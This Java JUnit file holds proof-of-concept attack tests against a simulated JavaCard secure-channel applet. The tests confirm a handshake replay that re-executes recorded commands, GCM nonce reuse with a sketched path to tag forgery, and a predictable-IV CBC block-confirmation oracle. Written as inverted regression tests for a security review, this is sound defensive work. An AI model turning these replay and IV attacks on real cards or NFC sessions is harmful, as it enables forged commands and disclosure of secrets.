package helloworld.integration;

import static helloworld.integration.SecureChannelClient.CLA;
import static helloworld.integration.SecureChannelClient.INS_EXCHANGE;
import static helloworld.integration.SecureChannelClient.INS_INIT;
import static helloworld.integration.SecureChannelClient.INS_SECRET_PING;
import static helloworld.integration.SecureChannelClient.SUITE_CBC_HMAC;
import static helloworld.integration.SecureChannelClient.SUITE_GCM;

import com.licel.jcardsim.smartcardio.CardSimulator;
import com.licel.jcardsim.utils.AIDUtil;
import helloworld.SecureChannelApplet;
import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import javacard.framework.AID;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.smartcardio.CommandAPDU;
import javax.smartcardio.ResponseAPDU;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

/**
 * Attack PoCs against the CURRENT secure channel (no fixes applied).
 *
 * <p>These tests assert that the attacks SUCCEED. They are deliberately
 * inverted: green means "vulnerability confirmed by execution". Once the
 * corresponding fix lands, each test must be flipped to assert the secure
 * behaviour (that is the regression test the review asked for).
 *
 * <p>Threat model for every attack: an on-path NFC relay/eavesdropper. It
 * sees only wire bytes (INIT/EXCHANGE payloads are cleartext, and even
 * protected messages carry their iv/seq fields in cleartext -- that is the
 * foundation of POC-B; only the payload is ciphertext). It holds no session
 * keys.
 *
 * <p>ATTACK PREMISE for POC-B (stated explicitly, this is the design
 * question owners must answer for their own app): the honest app encrypts a
 * plaintext whose FIRST block (offset 0, block-aligned) is attacker-
 * controlled, at a known sequence position -- e.g. a feedback/search field
 * placed at the start of the payload, like the attacker-injected HTTP body
 * in the TLS 1.0 / BEAST line of attacks. If the app's own bytes occupy
 * offset 0 (length prefix, command tag), the exact block-0 collision does
 * not fire; alignment can still be brute-forced with a few extra messages
 * (BEAST's trick) for any secret block index that carries injectable
 * content. If your app guarantees no such field can ever exist at an
 * injectable block position, the POC-B exploit does not apply -- but the IV
 * design outsources that guarantee to every future feature of the app.
 *
 * <p>Running: failsafe injects the secure-applet AID; plain-JUnit runs need
 * -Djavacard.secure.applet.id.nocolons=... or initialization fails.
 */
public class SecureChannelPocTest {

  private static final int SW_OK = 0x9000;
  private static final int APDU_DATA_OFF = 5; // cla ins p1 p2 lc

  private static CardSimulator simulator;
  private static byte[] gcmAid;
  private static byte[] cbcAid;

  @BeforeAll
  static void beforeAll() {
    simulator = new CardSimulator();
    gcmAid = hex(System.getProperty("javacard.secure.applet.id.nocolons"));
    cbcAid = gcmAid.clone();
    cbcAid[cbcAid.length - 1] += 1; // same scheme as SecureChannelAppletTest
    install(gcmAid, SUITE_GCM);
    install(cbcAid, SUITE_CBC_HMAC);
  }

  @BeforeEach
  void reset() {
    simulator.reset();
  }

  private static void install(byte[] aidBytes, byte suite) {
    AID aid = AIDUtil.create(aidBytes);
    try {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      bos.write(aidBytes.length);
      bos.write(aidBytes);
      bos.write(0x01);
      bos.write(0x00);
      bos.write(0x01);
      bos.write(suite);
      simulator.installApplet(aid, SecureChannelApplet.class,
          bos.toByteArray(), (short) 0, (byte) bos.size());
    } catch (Exception e) {
      throw new RuntimeException(e);
    }
  }

  /**
   * POC-A (Finding 1): replaying a captured EXCHANGE while ACTIVE re-derives
   * the same keys, resets both counters and makes previously executed
   * protected commands execute AGAIN. Run for both suites. For suite 01 also
   * proves GCM keystream reuse (identical IV for two different responses).
   */
  @Test
  public void pocA_exchangeReplayReactivatesOldCommands() throws Exception {
    runPocA(gcmAid, SUITE_GCM);
    runPocA(cbcAid, SUITE_CBC_HMAC);
  }

  private void runPocA(byte[] aid, byte suite) throws Exception {
    String tag = suite == SUITE_GCM ? "GCM" : "CBC";
    SecureChannelClient c = new SecureChannelClient(simulator, aid, suite);
    c.select();

    // Honest handshake; the attacker records the EXCHANGE APDU from the wire.
    ResponseAPDU init = c.transmit(new CommandAPDU(CLA, INS_INIT, 0, 0, 255));
    byte[] exBody = c.startExchange(init.getData());
    CommandAPDU wireExchange = new CommandAPDU(CLA, INS_EXCHANGE, 0, 0, exBody);
    c.finishExchange(c.transmit(wireExchange));

    // Two honest protected commands (equal length for the keystream check).
    byte[] p1 = "AAAAAAAAAAAAAAAA".getBytes();
    byte[] p2 = "BBBBBBBBBBBBBBBB".getBytes();
    CommandAPDU wirePing1 = c.protect(INS_SECRET_PING, p1);
    ResponseAPDU respPing1 = c.transmit(wirePing1);
    c.open(INS_SECRET_PING, respPing1);
    CommandAPDU wirePing2 = c.protect(INS_SECRET_PING, p2);
    c.transmit(wirePing2);

    // --- attack: replay the recorded EXCHANGE while session is ACTIVE ---
    ResponseAPDU replayedExchange = c.transmit(wireExchange);
    int sw = replayedExchange.getSW();
    System.out.println("FACT A1 [" + tag + "]: replayed EXCHANGE while ACTIVE"
        + " -> SW=" + Integer.toHexString(sw)
        + " (a sound handshake state machine must return 6982)");
    assertEquals(SW_OK, sw,
        "POC-A[" + tag + "] expects the VULNERABILITY: card must accept the"
            + " replayed EXCHANGE. If this now fails, the state-machine fix is"
            + " in place -> convert this test into the regression test.");

    // --- attack: a previously executed command runs again ---
    ResponseAPDU replayedPing2 = c.transmit(wirePing2);
    assertEquals(SW_OK, replayedPing2.getSW(),
        "POC-A[" + tag + "]: recorded command must be re-accepted after the"
            + " EXCHANGE replay");
    // The card echoes the decrypted plaintext -> proves real re-execution.
    byte[] echoed = c.open(INS_SECRET_PING, replayedPing2);
    assertEquals(new String(p2), new String(echoed),
        "POC-A[" + tag + "]: echo proves the recorded command was executed"
            + " a SECOND time");
    System.out.println("FACT A2 [" + tag + "]: recorded command replayed"
        + " after EXCHANGE replay -> accepted again, card echoed '"
        + new String(echoed) + "'");

    if (suite == SUITE_GCM) {
      // The replayed command's response used txSeq=1 again: same (key, IV)
      // as the original first response -> identical keystream.
      //
      // Severity note: nonce reuse here is worse than the keystream leak
      // shown by FACT A3. Two (ct, tag) pairs under the SAME nonce give two
      // tag equations that are linear in the GHASH key H over GF(2^128)
      // with the SAME mask E_k(J0): an attacker who knows one plaintext
      // solves for H outright. Forging a NEW command additionally needs the
      // mask of the forged IV -- a fresh seq has an unknown mask -- but F1
      // itself hands the attacker exactly that: after an EXCHANGE replay the
      // card re-accepts OLD seq numbers, i.e. IVs whose masks were already
      // observed. H-recovery + F1 reset (or the silent increment() wrap at
      // 2^32 responses) => forged commands with valid tags, AES key never
      // learned. Integrity total loss: suite-01 + F1 is Critical, not High.
      //
      // No CBC analogue of this test on purpose: CBC is not a masked mode,
      // a repeated IV leaks equal first plaintext blocks at most, and
      // HMAC has no linear-in-key tag equation that IV reuse can solve.
      byte[] ivOrig = Arrays.copyOfRange(respPing1.getData(), 0, 12);
      byte[] ivRepl = Arrays.copyOfRange(replayedPing2.getData(), 0, 12);
      assertTrue(Arrays.equals(ivOrig, ivRepl),
          "POC-A[GCM]: response IV repeats after counter reset");
      byte[] ctOrig = Arrays.copyOfRange(respPing1.getData(), 12, 28);
      byte[] ctRepl = Arrays.copyOfRange(replayedPing2.getData(), 12, 28);
      byte[] keystreamDiff = xor(ctOrig, ctRepl);
      assertTrue(Arrays.equals(keystreamDiff, xor(p1, p2)),
          "POC-A[GCM]: ct1 XOR ct2 must equal p1 XOR p2 under a reused"
              + " keystream");
      System.out.println("FACT A3 [GCM]: response IV " + hexStr(ivOrig)
          + " reused; ct1 XOR ct2 == p1 XOR p2 -> SAME KEYSTREAM for two"
          + " different responses; combined with F1's counter reset this"
          + " chain also yields GHASH-key recovery and forgery (Critical)");
    }
  }

  /**
   * POC-B (Finding 3): the CBC (suite 02) command IV is
   * nPeer[0..4) || counter || zeros -- fully predictable to anyone who saw
   * the cleartext handshake. With the documented premise (attacker-
   * controlled FIRST block of a later message at a known sequence
   * position), the attacker confirms a whole-block hypothesis about a
   * PREVIOUS encrypted message with probability 1. The oracle answers
   * block-granular equality only (all-or-nothing); extracting a secret
   * block means enumerating candidate blocks, which is realistic for
   * low-entropy structured payloads and infeasible for random ones.
   */
  @Test
  public void pocB_cbcPredictableIv_confirmsSecretBytes() throws Exception {
    SecureChannelClient c = new SecureChannelClient(simulator, cbcAid,
        SUITE_CBC_HMAC);
    c.select();

    // Handshake observed in cleartext gives both IV prefixes.
    ResponseAPDU init = c.transmit(new CommandAPDU(CLA, INS_INIT, 0, 0, 255));
    byte[] exBody = c.startExchange(init.getData());
    // exBody = qPeer(65) || nPeer(16) || iv || sealed
    byte[] nPeer = Arrays.copyOfRange(exBody, 65, 65 + 16);
    c.finishExchange(c.transmit(
        new CommandAPDU(CLA, INS_EXCHANGE, 0, 0, exBody)));
    byte[] rxPrefix = Arrays.copyOfRange(nPeer, 0, 4);

    // Honest app encrypts a secret transfer (message 1, rxSeq=1).
    byte[] secret = "TOPUP 999999 to 42|ref:DEADBEEF".getBytes();
    CommandAPDU wireSecret = c.protect(INS_SECRET_PING, secret);
    byte[] w = wireSecret.getBytes();
    byte[] v = Arrays.copyOfRange(w, APDU_DATA_OFF, APDU_DATA_OFF + 16);
    byte[] ct0 = Arrays.copyOfRange(w, APDU_DATA_OFF + 16,
        APDU_DATA_OFF + 32);
    assertTrue(Arrays.equals(Arrays.copyOfRange(v, 0, 4), rxPrefix),
        "sanity: IV prefix is the cleartext nPeer prefix");

    // Attacker predicts the NEXT command IV exactly: counter +1, zeros.
    // Layout: prefix(4) || seq(8, big endian) || zeros(4) -> seq low byte
    // lives at index 11.
    assertEquals((byte) 0x01, v[11], "sanity: first message has seq 1");
    byte[] vNext = v.clone();
    vNext[11] = (byte) 0x02; // seq 1 -> 2, low 4 bytes stay zero
    System.out.println("FACT B0: next CBC command IV predicted as "
        + hexStr(vNext) + " (prefix and counter are cleartext-derived)");

    // Correct hypothesis about the first plaintext block of the secret.
    byte[] h = Arrays.copyOfRange(secret, 0, 16);
    byte[] x = xor(xor(h, v), vNext); // P' = P XOR V XOR V'
    CommandAPDU feedback = c.protect(INS_SECRET_PING,
        concat(x, "filler0123456789".getBytes()));
    byte[] fb = feedback.getBytes();
    assertTrue(Arrays.equals(
        Arrays.copyOfRange(fb, APDU_DATA_OFF, APDU_DATA_OFF + 16), vNext),
        "POC-B: the predicted IV must match the actual IV");
    byte[] fbCt0 = Arrays.copyOfRange(fb, APDU_DATA_OFF + 16,
        APDU_DATA_OFF + 32);

    System.out.println("FACT B1: correct hypothesis -> first ciphertext"
        + " blocks equal (prob. 1): " + Arrays.equals(fbCt0, ct0)
        + " => attacker CONFIRMS the secret block '"
        + new String(h) + "' (whole-block confirmation, see B2)");
    assertTrue(Arrays.equals(fbCt0, ct0),
        "POC-B: with the correct hypothesis, the first CBC blocks must"
            + " collide deterministically");

    // One byte wrong -> no collision (the test proves it is a discriminator,
    // not an accident).
    byte[] hWrong = h.clone();
    hWrong[8] ^= 0x01; // '9' -> '8'
    byte[] xWrong = xor(xor(hWrong, v), nextCounter(vNext));
    CommandAPDU fbWrong = c.protect(INS_SECRET_PING,
        concat(xWrong, "filler0123456789".getBytes()));
    byte[] fbw = fbWrong.getBytes();
    byte[] fbwCt0 = Arrays.copyOfRange(fbw, APDU_DATA_OFF + 16,
        APDU_DATA_OFF + 32);
    System.out.println("FACT B2: hypothesis off by one bit -> blocks equal:"
        + " " + Arrays.equals(fbwCt0, ct0) + " (the oracle is block-level"
        + " all-or-nothing: even one bit off breaks the collision; secret"
        + " extraction = enumerate whole-block guesses, feasible for"
        + " low-entropy structured blocks like this one, hopeless for 16"
        + " random bytes)");
    assertTrue(!Arrays.equals(fbwCt0, ct0),
        "POC-B: a wrong hypothesis must NOT collide");

    // The MAC/ETM does not help: everything above is valid protocol traffic.
    System.out.println("FACT B3: the attack sends only MAC-valid protocol"
        + " messages; Encrypt-then-MAC protects integrity, not"
        + " confidentiality of predictable-IV CBC");
  }

  /**
   * CONTROL for POC-B: same attack shape against a random-IV CBC variant.
   * Randomized CBC is IND-CPA secure until an IV repeats (birthday bound;
   * Iwata-Oka 2001, the randomized-IV result). This loop is an empirical
   * illustration of that, not a proof: with independent random IVs every
   * collision attempt succeeds with probability 2^-128 per try.
   */
  @Test
  public void control_cbcRandomIv_attackFails() throws Exception {
    // Fixed key is irrelevant to the collision argument: E_K is a
    // permutation for every K; only IV equality can make blocks collide.
    SecretKeySpec key = new SecretKeySpec(new byte[32], "AES");
    Cipher enc = Cipher.getInstance("AES/CBC/NoPadding");
    byte[] p = "TOPUP 999999 to ".getBytes();
    int hits = 0;
    java.security.SecureRandom rnd = new java.security.SecureRandom();
    for (int i = 0; i < 2000; i++) {
      // Message 1 under an unpredictable random IV.
      byte[] iv = new byte[16];
      rnd.nextBytes(iv);
      enc.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
      byte[] ct0 = enc.doFinal(p);
      // Without knowledge of either IV, resending the hypothesised
      // plaintext is just one instance of the general attack shape; blocks
      // can only collide via IV equality: p = 2^-128 per try.
      byte[] ivNext = new byte[16];
      rnd.nextBytes(ivNext);
      enc.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(ivNext));
      byte[] fb0 = enc.doFinal(p);
      if (Arrays.equals(fb0, ct0)) {
        hits++;
      }
    }
    System.out.println("FACT CONTROL: random-IV variant: " + hits
        + " successful confirmations in 2000 attempts (expected ~0,"
        + " p=2^-128 per try)");
    assertEquals(0, hits,
        "CONTROL: random IV must defeat the confirmation attack");
  }

  // --- tiny helpers ---------------------------------------------------------

  private static byte[] nextCounter(byte[] iv) {
    // Increments the big-endian seq (bytes 4..11) only; wraps silently at
    // 256 like the card's increment() does at the full width. Fine here:
    // fixed inputs, seq never leaves [1..3].
    byte[] r = iv.clone();
    r[11] = (byte) (r[11] + 1); // big-endian seq occupies bytes 4..11
    return r;
  }

  private static byte[] xor(byte[] a, byte[] b) {
    byte[] r = new byte[a.length];
    for (int i = 0; i < a.length; i++) {
      r[i] = (byte) (a[i] ^ b[i]);
    }
    return r;
  }

  private static byte[] concat(byte[]... parts) {
    int n = 0;
    for (byte[] p : parts) {
      n += p.length;
    }
    byte[] out = new byte[n];
    int off = 0;
    for (byte[] p : parts) {
      System.arraycopy(p, 0, out, off, p.length);
      off += p.length;
    }
    return out;
  }

  private static byte[] hex(String s) {
    byte[] out = new byte[s.length() / 2];
    for (int i = 0; i < out.length; i++) {
      out[i] = (byte) Integer.parseInt(s.substring(2 * i, 2 * i + 2), 16);
    }
    return out;
  }

  private static String hexStr(byte[] b) {
    StringBuilder sb = new StringBuilder();
    for (byte x : b) {
      sb.append(String.format("%02x", x));
    }
    return sb.toString();
  }

  private static void assertEquals(Object expected, Object actual, String msg) {
    org.junit.jupiter.api.Assertions.assertEquals(expected, actual, msg);
  }

  private static void assertTrue(boolean cond, String msg) {
    org.junit.jupiter.api.Assertions.assertTrue(cond, msg);
  }
}
